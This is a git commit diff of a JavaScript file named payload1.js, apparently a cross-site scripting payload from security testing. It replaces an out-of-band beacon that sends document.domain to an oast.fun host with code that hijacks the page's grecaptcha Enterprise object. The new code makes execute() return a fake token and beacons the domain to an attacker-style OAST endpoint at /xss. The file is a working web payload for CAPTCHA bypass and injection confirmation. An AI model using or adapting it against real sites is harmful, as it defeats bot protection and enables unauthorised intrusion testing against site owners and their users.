227ec066113c82fcab297a6e44fcfda1b5194155
siddhu-1005 <84862560+siddhu-1005@users.noreply.github.com>
2025-07-25 21:15:27 +0530

    payload1.js

--- payload1.js
+++ payload1.js
@@ -1,1 +1,10 @@
-new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/confirm?" + document.domain;
+// Hijack grecaptcha object to fake token generation
+window.grecaptcha = {
+  enterprise: {
+    ready: (cb) => cb(),
+    execute: (key, opt) => {
+      new Image().src = "https://<your-oast>.oast.fun/xss?d=" + document.domain;
+      return Promise.resolve("fake-token");
+    }
+  }
+};
